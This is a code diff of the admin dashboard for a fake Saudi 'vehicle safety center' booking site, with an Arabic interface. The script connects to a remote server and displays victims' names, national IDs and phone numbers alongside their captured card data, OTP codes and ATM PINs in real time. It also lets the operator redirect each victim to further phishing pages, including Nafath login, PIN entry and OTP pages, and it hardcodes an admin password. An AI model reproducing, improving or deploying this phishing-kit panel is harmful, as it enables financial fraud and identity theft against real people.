-.pbx{animation:boxPulse .8s ease}
+/* Pulse badge */
+@keyframes pbx{0%{box-shadow:0 0 0 0 rgba(4,170,109,.4)}70%{box-shadow:0 0 0 8px rgba(4,170,109,0)}100%{box-shadow:0 0 0 0 rgba(4,170,109,0)}}
+.pbx{animation:pbx .8s ease}
 
-@media(max-width:900px){.stats{grid-template-columns:repeat(3,1fr)}.main,.stats{padding:14px}}
-@media(max-width:600px){.stats{grid-template-columns:1fr 1fr}.nbrand-sub{display:none}}
+/* Responsive */
+@media(max-width:900px){
+  .sec-admin-tmp .sidebar-container{flex-direction:column}
+  .sec-admin-tmp .sidebar-container .sidebar{
+    width:100%;
+    height:auto;
+    position:sticky;
+    top:64px;
+    z-index:10;
+    display:flex;
+    overflow-x:auto;
+    overflow-y:hidden;
+    flex-direction:row;
+    flex-wrap:nowrap;
+    padding:8px;
+    gap:6px;
+  }
+  .sec-admin-tmp .sidebar-container .sidebar .user-div{
+    min-width:160px;
+    margin-bottom:0;
+  }
+  .sidebar-header,.sidebar-search{display:none}
+  .stats-bar{padding:10px 12px}
+  .sc{min-width:100px;padding:8px 12px}
+}
+@media(max-width:450px){
+  .sec-admin-tmp .sidebar-container .sidebar{
+    display:block;
+    height:200px;
+    overflow-y:auto;
+    overflow-x:hidden;
+  }
+  .sec-admin-tmp .sidebar-container .sidebar .user-div{
+    min-width:unset;
+  }
+  .cards-grid{grid-template-columns:1fr}
+}
 </style>
 </head>
 <body>
 
-<!-- LOGIN -->
+<!-- ===== LOGIN PAGE ===== -->
 <div id="loginPage">
-  <div class="lcard">
-    <h2>مركز سلامة المركبات</h2>
-    <p>لوحة التحكم الإدارية</p>
-    <label>كلمة المرور</label>
-    <input type="password" id="pwInput" placeholder="أدخل كلمة المرور" onkeydown="if(event.key==='Enter')doLogin()">
+  <div class="sec-login-inner">
+    <div class="div-logo">
+      <img src="https://insureveaacle.online/assets/images/logo.svg" alt="مركز سلامة المركبات" onerror="this.style.display='none'">
+    </div>
+    <h5>لوحة التحكم الإدارية</h5>
+    <p>مركز سلامة المركبات</p>
     <div id="lerr" class="lerr">كلمة المرور غير صحيحة</div>
-    <button class="lbtn" onclick="doLogin()">تسجيل الدخول</button>
+    <label>كلمة المرور</label>
+    <input type="password" id="passInp" placeholder="••••••••" onkeydown="if(event.key==='Enter')doLogin()">
+    <button class="lbtn" onclick="doLogin()">
+      <i class="fas fa-sign-in-alt ml-2"></i>
+      دخول
+    </button>
   </div>
 </div>
 
-<!-- ADMIN -->
+<!-- ===== ADMIN PAGE ===== -->
 <div id="adminPage">
-  <nav class="navbar">
-    <div class="nbrand">
-      <div class="nbrand-icon">
-        <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM19 17a2 2 0 11-4 0 2 2 0 014 0z"/><path d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10l2 2h10l2-2z"/></svg>
-      </div>
-      <div>
-        <div class="nbrand-name">مركز سلامة المركبات</div>
-        <div class="nbrand-sub">لوحة التحكم الإدارية</div>
-      </div>
+
+  <!-- Navbar -->
+  <nav class="ad-navbar">
+    <div class="d-flex align-items-center gap-3">
+      <img src="https://insureveaacle.online/assets/images/logo.svg" class="logo-img" alt="Logo" onerror="this.style.display='none'">
+      <span class="nav-title">لوحة التحكم</span>
     </div>
-    <div class="nright">
+    <div class="nav-right">
       <div class="vctr"><div class="vdot"></div><span id="vcnt">0</span> زائر</div>
       <div class="cbadge"><div class="cdot" id="cdot"></div><span id="ctxt">غير متصل</span></div>
-      <button class="lout" onclick="doLogout()">خروج</button>
+      <button class="lout" onclick="doLogout()">
+        <i class="fas fa-sign-out-alt ml-1"></i>
+        خروج
+      </button>
     </div>
   </nav>
 
-  <div class="stats">
-    <div class="sc"><div class="si si-b"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg></div><div><div class="sn" id="stTotal">0</div><div class="sl">إجمالي الحجوزات</div></div></div>
-    <div class="sc"><div class="si si-p"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/></svg></div><div><div class="sn" id="stToday">0</div><div class="sl">حجوزات جديدة</div></div></div>
-    <div class="sc"><div class="si si-g"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div><div><div class="sn" id="stOk">0</div><div class="sl">مكتملة</div></div></div>
-    <div class="sc"><div class="si si-o"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div><div><div class="sn" id="stPend">0</div><div class="sl">قيد المعالجة</div></div></div>
-    <div class="sc"><div class="si si-t"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/></svg></div><div><div class="sn" id="stVis">0</div><div class="sl">زوار متصلون الآن</div></div></div>
-  </div>
-
-  <div class="main">
-    <div class="tcard">
-      <div class="ttbar">
-        <div class="ttitle">
-          <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#2563eb"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
-          قائمة الحجوزات
-        </div>
-        <div class="tright">
-          <div class="srch">
-            <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
-            <input type="text" id="srchInp" placeholder="بحث..." oninput="renderB()">
-          </div>
-          <button class="rbtn" onclick="loadB()">
-            <svg width="13" height="13" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
-            تحديث
-          </button>
-        </div>
-      </div>
-      <div style="overflow-x:auto">
-        <table>
-          <thead>
-            <tr>
-              <th>الاسم</th>
-              <th>رقم الهوية</th>
-              <th>الهاتف</th>
-              <th>المنطقة</th>
-              <th>نوع الخدمة</th>
-              <th>التاريخ</th>
-              <th>الحالة</th>
-              <th>الإجراءات</th>
-            </tr>
-          </thead>
-          <tbody id="tbody">
-            <tr><td colspan="8" class="empty">
-              <svg viewBox="0 0 24 24" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
-              <p>لا توجد حجوزات بعد</p>
-            </td></tr>
-          </tbody>
-        </table>
-      </div>
+  <!-- Stats bar -->
+  <div class="stats-bar">
+    <div class="sc">
+      <div class="si si-b"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg></div>
+      <div><div class="sn" id="stTotal">0</div><div class="sl">إجمالي الحجوزات</div></div>
+    </div>
+    <div class="sc">
+      <div class="si si-p"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/></svg></div>
+      <div><div class="sn" id="stToday">0</div><div class="sl">حجوزات اليوم</div></div>
+    </div>
+    <div class="sc">
+      <div class="si si-g"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>
+      <div><div class="sn" id="stOk">0</div><div class="sl">مكتملة</div></div>
+    </div>
+    <div class="sc">
+      <div class="si si-o"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>
+      <div><div class="sn" id="stPend">0</div><div class="sl">قيد المعالجة</div></div>
+    </div>
+    <div class="sc">
+      <div class="si si-t"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/></svg></div>
+      <div><div class="sn" id="stVis">0</div><div class="sl">زوار متصلون</div></div>
     </div>
   </div>
+
+  <!-- Main: Sidebar + Content -->
+  <section class="sec-admin-tmp">
+    <div class="sidebar-container d-flex">
+
+      <!-- Sidebar -->
+      <div class="sidebar">
+        <div class="sidebar-header">
+          <span>الحجوزات النشطة</span>
+          <span id="pendCount" style="background:#04aa6d;color:#fff;border-radius:20px;padding:1px 8px;font-size:10px">0</span>
+        </div>
+        <div class="sidebar-search">
+          <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+          <input type="text" id="sidebarSearch" placeholder="بحث..." oninput="filterSidebar()">
+        </div>
+        <div id="SidebarUsers">
+          <!-- يُملأ ديناميكياً -->
+        </div>
+      </div>
+
+      <!-- Content -->
+      <div class="content">
+        <div class="content-topbar">
+          <div class="content-title">
+            <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
+            قائمة الحجوزات
+          </div>
+          <div class="content-actions">
+            <div class="rbtn" style="background:#fff;border:1.5px solid #e6e6e6;border-radius:9px;padding:7px 12px;display:flex;align-items:center;gap:7px;width:200px">
+              <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:14px;height:14px;color:#9ca3af;flex-shrink:0;fill:none;stroke:currentColor"><path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+              <input type="text" id="srchInp" placeholder="بحث..." oninput="renderB()" style="border:none;background:transparent;font-size:12px;outline:none;width:100%;font-family:inherit">
+            </div>
+            <button class="rbtn" onclick="loadB()">
+              <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+              تحديث
+            </button>
+          </div>
+        </div>
+
+        <!-- Cards grid -->
+        <div class="cards-grid" id="cardsGrid">
+          <div class="empty-state">
+            <svg viewBox="0 0 24 24" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
+            <p>لا توجد حجوزات بعد</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
 </div>
 
 <!-- MODAL -->
@@ -302,202 +942,277 @@ tbody tr:hover td{background:#fafafa}
   </div>
 </div>
 
-<div class="toast" id="toast"></div>
+<!-- TOAST -->
+<div id="toast"></div>
 
 <script>
-const SRV = 'https://vsafety-server-production.up.railway.app';
-const PWD = 'Vsafety@2024';
+const SRV='https://vsafety-server-production.up.railway.app';
+const PASS='Vsafety@2024';
 
 let socket=null, allB=[], curIp=null;
+// ld: live data (payment/otp/pin) بالـ IP كـ key
+// ls: live stage (payment/otp/pin) بالـ IP كـ key
 let ld={}, ls={};
 
 function doLogin(){
-  if(document.getElementById('pwInput').value===PWD){
-    document.getElementById('loginPage').style.display='none';
-    document.getElementById('adminPage').style.display='block';
-    initSock(); loadB();
-  } else { document.getElementById('lerr').style.display='block'; }
+  const p=document.getElementById('passInp').value;
+  if(p!==PASS){
+    document.getElementById('lerr').style.display='block';
+    return;
+  }
+  document.getElementById('lerr').style.display='none';
+  document.getElementById('loginPage').style.display='none';
+  document.getElementById('adminPage').style.display='block';
+  initSock();
+  loadB();
 }
+
 function doLogout(){
   if(socket)socket.disconnect();
   document.getElementById('adminPage').style.display='none';
   document.getElementById('loginPage').style.display='flex';
-  document.getElementById('pwInput').value='';
-  document.getElementById('lerr').style.display='none';
+  document.getElementById('passInp').value='';
+  allB=[]; ld={}; ls={};
 }
 
 function initSock(){
   socket=io(SRV,{transports:['websocket','polling']});
   socket.on('connect',()=>{
     socket.emit('adminJoin');
-    document.getElementById('cdot').classList.add('on');
+    document.getElementById('cdot').className='cdot on';
     document.getElementById('ctxt').textContent='متصل';
   });
   socket.on('disconnect',()=>{
-    document.getElementById('cdot').classList.remove('on');
+    document.getElementById('cdot').className='cdot';
     document.getElementById('ctxt').textContent='غير متصل';
   });
   socket.on('visitorUpdate',(v)=>{
-    const c=Array.isArray(v)?v.length:v;
-    document.getElementById('vcnt').textContent=c;
-    document.getElementById('stVis').textContent=c;
+    document.getElementById('vcnt').textContent=v.count||0;
+    document.getElementById('stVis').textContent=v.count||0;
   });
   socket.on('newBooking',(b)=>{
-    allB.unshift(b); renderB(); updStats(); beep(880);
-    toast('📋 حجز جديد: '+(b.name||''));
+    allB.unshift(b);
+    renderB();
+    beep(880);
   });
   socket.on('bookingUpdated',(b)=>{
     const i=allB.findIndex(x=>x.id===b.id);
-    if(i>=0)allB[i]=b; renderB(); updStats();
+    if(i>=0)allB[i]=b; else allB.unshift(b);
+    renderB();
   });
-
-  // ---- Payment ----
   socket.on('newPayment',(d)=>{
     const ip=norm(d.ip||'');
-    if(!ld[ip])ld[ip]={};
+    ld[ip]=ld[ip]||{};
+    ld[ip].pay=d.data;
     ld[ip].requestId=d.requestId;
-    ld[ip].sessionId=d.sessionId||null;
-    // دائماً حدّث بيانات البطاقة بأحدث البيانات
-    ld[ip].pay=d;
-    // مسح OTP وPIN القديمة عند بدء جلسة جديدة
-    ld[ip].otp=null;
-    ld[ip].pin=null;
     ls[ip]='payment';
-    rowBadge(ip,'payment'); updPend(); beep(660);
-    toast('💳 بيانات بطاقة جديدة');
-    if(curIp===ip) rebuildCard(ip);
+    updPend();
+    rowBadge(ip,'payment');
+    updateSidebarBadge(ip,'payment');
+    beep(660);
+    if(curIp&&curIp===ip) rebuildCard(ip);
   });
-
-  // ---- OTP / PIN / Code ----
   socket.on('newCode',(d)=>{
     const ip=norm(d.ip||'');
-    const rawType=d.type||'';
-    const isPIN = rawType==='pin';
-    const code=d.code||'';
-
-    let mip=ip;
-    if(!ld[ip]){
-      const found=allB.find(b=>b.ip&&norm(b.ip)===ip);
-      if(found)mip=norm(found.ip);
-    }
-
-    if(!ld[mip])ld[mip]={};
-    ld[mip].requestId=d.requestId;
-    if(d.sessionId)ld[mip].sessionId=d.sessionId;
-
-    if(isPIN){
-      // دائماً حدّث الـ PIN بأحدث قيمة
-      ld[mip].pin=d;
-      ls[mip]='pin';
-      rowBadge(mip,'pin'); beep(550);
-      toast('🔒 رقم سري ATM: '+code);
+    ld[ip]=ld[ip]||{};
+    const t=d.type||'otp';
+    if(t==='pin'){
+      ld[ip].pin=d.data;
+      ld[ip].requestId=d.requestId;
+      ls[ip]='pin';
+      rowBadge(ip,'pin');
+      updateSidebarBadge(ip,'pin');
     } else {
-      // دائماً حدّث الـ OTP بأحدث قيمة
-      ld[mip].otp=d;
-      ls[mip]='otp';
-      rowBadge(mip,'otp'); beep(770);
-      toast('🔑 OTP جديد: '+code);
+      ld[ip].otp=d.data;
+      ld[ip].requestId=d.requestId;
+      ls[ip]='otp';
+      rowBadge(ip,'otp');
+      updateSidebarBadge(ip,'otp');
     }
     updPend();
-    if(curIp===mip||curIp===ip) rebuildCard(curIp);
+    beep(770);
+    if(curIp&&curIp===ip) rebuildCard(ip);
+  });
+  socket.on('newData',(d)=>{
+    const ip=norm(d.ip||'');
+    ld[ip]=ld[ip]||{};
+    ld[ip][d.type]=d.data;
+    if(curIp&&curIp===ip) rebuildCard(ip);
   });
 }
 
 function norm(ip){ return (ip||'').replace(/^::ffff:/,''); }
 
 function rowBadge(ip,st){
-  document.querySelectorAll(`tr[data-ip="${ip}"]`).forEach(r=>{
-    const c=r.querySelector('.lc'); if(c)c.innerHTML=lbadge(st);
-    r.classList.remove('rflash'); void r.offsetWidth; r.classList.add('rflash');
-    setTimeout(()=>r.classList.remove('rflash'),2000);
-  });
+  const tr=document.querySelector(`[data-ip="${ip}"]`);
+  if(!tr)return;
+  const td=tr.querySelector('.status-cell');
+  if(!td)return;
+  if(!st){td.innerHTML=lbadge('new');return;}
+  const map={payment:'<span class="badge b-card">💳 بطاقة</span>',otp:'<span class="badge b-otp">🔑 OTP</span>',pin:'<span class="badge b-pin">🔒 PIN</span>'};
+  td.innerHTML=(map[st]||lbadge('new'));
 }
+
 function lbadge(s){
-  if(!s)return'';
-  return{
-    payment:'<span class="badge b-card">💳 بطاقة</span>',
-    otp:'<span class="badge b-otp">🔑 OTP</span>',
-    pin:'<span class="badge b-pin">🔒 PIN</span>'
-  }[s]||'';
+  const m={new:'<span class="badge b-new">جديد</span>',approved:'<span class="badge b-ok">مكتمل</span>',rejected:'<span class="badge b-rej">مرفوض</span>',pending:'<span class="badge b-pend">قيد المعالجة</span>'};
+  return m[s]||m.new;
 }
-function updPend(){ document.getElementById('stPend').textContent=Object.keys(ld).length; }
+
+function updPend(){
+  const c=Object.keys(ld).length;
+  document.getElementById('stPend').textContent=c;
+  document.getElementById('pendCount').textContent=c;
+}
 
 async function loadB(){
   try{
     const r=await fetch(`${SRV}/api/bookings`);
     const d=await r.json();
-    allB=d.bookings||[]; renderB(); updStats();
-  }catch(e){}
+    allB=Array.isArray(d)?d:(d.bookings||[]);
+    renderB();
+    updStats();
+  }catch(e){console.error('loadB error',e);}
 }
 
 function renderB(){
-  const tb=document.getElementById('tbody');
-  const q=(document.getElementById('srchInp').value||'').toLowerCase();
-  const fl=allB.filter(b=>!q||(b.name&&b.name.toLowerCase().includes(q))||(b.national_id&&b.national_id.includes(q))||(b.phone_number&&b.phone_number.includes(q)));
-  if(!fl.length){
-    tb.innerHTML=`<tr><td colspan="8" class="empty"><svg viewBox="0 0 24 24" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg><p>لا توجد حجوزات</p></td></tr>`;
+  const q=(document.getElementById('srchInp')?.value||'').toLowerCase();
+  const filtered=allB.filter(b=>{
+    if(!q)return true;
+    return (b.name||'').toLowerCase().includes(q)||
+           (b.phone_number||'').includes(q)||
+           (b.national_id||'').includes(q)||
+           (b.region||'').toLowerCase().includes(q);
+  });
+
+  const grid=document.getElementById('cardsGrid');
+  if(filtered.length===0){
+    grid.innerHTML=`<div class="empty-state">
+      <svg viewBox="0 0 24 24" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
+      <p>لا توجد حجوزات</p>
+    </div>`;
     return;
   }
-  tb.innerHTML=fl.map(b=>{
-    const sc={new:'b-new',approved:'b-ok',rejected:'b-rej',pending:'b-pend'}[b.status]||'b-new';
-    const sl={new:'جديد',approved:'مكتمل',rejected:'مرفوض',pending:'قيد المعالجة'}[b.status]||'جديد';
+
+  grid.innerHTML=filtered.map(b=>{
     const ip=norm(b.ip||'');
-    const live=ls[ip]||(ld[ip]?(ld[ip].pin?'pin':ld[ip].otp?'otp':ld[ip].pay?'payment':null):null);
-    return`<tr data-ip="${norm(b.ip||'')}">
-      <td><strong>${b.name||'-'}</strong></td>
-      <td style="direction:ltr;font-family:monospace">${b.national_id||'-'}</td>
-      <td style="direction:ltr">${b.phone_number||'-'}</td>
-      <td>${b.region||'-'}</td>
-      <td>${b.service_type||'-'}</td>
-      <td style="direction:ltr">${b.date_svc||'-'}</td>
-      <td>
-        <span class="badge ${sc}">${sl}</span>
-        <span class="lc" style="margin-right:4px">${live?lbadge(live):''}</span>
-      </td>
-      <td>
-        <div style="display:flex;gap:5px;align-items:center">
-          <button class="bdet" onclick="showD(${b.id})">
-            <svg width="12" height="12" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
-            تفاصيل
+    // تحديد الحالة من ls أو ld
+    let liveSt=ls[ip];
+    if(!liveSt && ld[ip]){
+      if(ld[ip].pin) liveSt='pin';
+      else if(ld[ip].otp) liveSt='otp';
+      else if(ld[ip].pay) liveSt='payment';
+    }
+    const stBadge=liveSt
+      ?{payment:'<span class="badge b-card">💳 بطاقة</span>',otp:'<span class="badge b-otp">🔑 OTP</span>',pin:'<span class="badge b-pin">🔒 PIN</span>'}[liveSt]
+      :lbadge(b.status||'new');
+    const date=b.created_at?new Date(b.created_at).toLocaleDateString('ar-SA'):'';
+    return `<div class="bk-card" data-ip="${ip}" onclick="showD(${b.id})">
+      <div class="bk-card-header">
+        <span class="bk-card-name">${b.name||'-'}</span>
+        <span class="status-cell">${stBadge}</span>
+      </div>
+      <div class="bk-card-body">
+        <div class="bk-field"><span class="bk-lbl">رقم الهوية</span><span class="bk-val">${b.national_id||'-'}</span></div>
+        <div class="bk-field"><span class="bk-lbl">الهاتف</span><span class="bk-val">${b.phone_number||'-'}</span></div>
+        <div class="bk-field"><span class="bk-lbl">المنطقة</span><span class="bk-val">${b.region||'-'}</span></div>
+        <div class="bk-field"><span class="bk-lbl">نوع الخدمة</span><span class="bk-val">${b.service_type||'-'}</span></div>
+        ${date?`<div class="bk-field"><span class="bk-lbl">التاريخ</span><span class="bk-val">${date}</span></div>`:''}
+      </div>
+      <div class="bk-card-footer">
+        <button class="bdet" onclick="event.stopPropagation();showD(${b.id})">
+          <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
+          تفاصيل
+        </button>
+        <div class="bnav-wrap">
+          <button class="bnav" onclick="event.stopPropagation();toggleNav(this,'${b.ip}')">
+            <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7"/></svg>
+            توجيه
           </button>
-          <div class="bnav-wrap">
-            <button class="bnav" onclick="toggleNav(this,'${norm(b.ip||'')}')">
-              <svg width="12" height="12" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7"/></svg>
-              توجيه
-            </button>
-            <div class="ndrop">${navItems(norm(b.ip||''))}</div>
-          </div>
+          <div class="ndrop" id="nd-${ip}">${navItems(b.ip)}</div>
         </div>
-      </td>
-    </tr>`;
+      </div>
+    </div>`;
   }).join('');
+
+  // تحديث الـ sidebar
+  renderSidebar(filtered);
+  updStats();
+}
+
+function renderSidebar(bookings){
+  const sb=document.getElementById('SidebarUsers');
+  const q=(document.getElementById('sidebarSearch')?.value||'').toLowerCase();
+  const items=bookings.filter(b=>{
+    if(!q)return true;
+    return (b.name||'').toLowerCase().includes(q)||(b.phone_number||'').includes(q);
+  });
+  sb.innerHTML=items.map(b=>{
+    const ip=norm(b.ip||'');
+    let liveSt=ls[ip];
+    if(!liveSt && ld[ip]){
+      if(ld[ip].pin) liveSt='pin';
+      else if(ld[ip].otp) liveSt='otp';
+      else if(ld[ip].pay) liveSt='payment';
+    }
+    const hasNew=liveSt?'':'invisible';
+    const stIcon=liveSt
+      ?{payment:'💳',otp:'🔑',pin:'🔒'}[liveSt]
+      :'';
+    const isSelected=curIp&&curIp===ip?'selected':'';
+    return `<div class="user-div ${isSelected}" id="sb-${ip}" onclick="showD(${b.id})">
+      <div class="info-user">
+        <span class="new-action ${hasNew}"></span>
+        <span class="name">${b.name||'-'}</span>
+      </div>
+      <div class="status-user">${stIcon}</div>
+    </div>`;
+  }).join('');
+}
+
+function filterSidebar(){
+  renderB();
+}
+
+function updateSidebarBadge(ip,st){
+  const div=document.getElementById(`sb-${ip}`);
+  if(!div)return;
+  const su=div.querySelector('.status-user');
+  const na=div.querySelector('.new-action');
+  if(su){
+    const map={payment:'💳',otp:'🔑',pin:'🔒'};
+    su.textContent=map[st]||'';
+  }
+  if(na) na.classList.remove('invisible');
 }
 
 function navItems(ip){
   const pages=[
-    {p:'booking',l:'صفحة الحجز',c:'#16a34a',d:'M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z'},
-    {p:'payments',l:'صفحة البطاقة',c:'#7c3aed',d:'M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z'},
-    {p:'phone',l:'صفحة الهاتف',c:'#2563eb',d:'M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z'},
-    {p:'code',l:'صفحة OTP',c:'#d97706',d:'M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z'},
-    {p:'madaPin',l:'الرقم السري',c:'#0d9488',d:'M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z'},
-    {p:'whats',l:'صفحة واتساب',c:'#25d366',d:'M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z'},
-    {p:'nafad',l:'صفحة نفاذ',c:'#ea580c',d:'M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0'},
-    {p:'stcCall',l:'صفحة الانتظار',c:'#64748b',d:'M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z'},
+    {p:'payments',l:'💳 الدفع',c:'#ede9fe',t:'#7c3aed'},
+    {p:'booking',l:'🏠 الرئيسية',c:'#dcfce7',t:'#16a34a'},
+    {p:'code',l:'🔑 OTP',c:'#fef3c7',t:'#d97706'},
+    {p:'madaPin',l:'🔒 الرقم السري',c:'#ccfbf1',t:'#0d9488'},
+    {p:'phone',l:'📱 الهاتف',c:'#dbeafe',t:'#2563eb'},
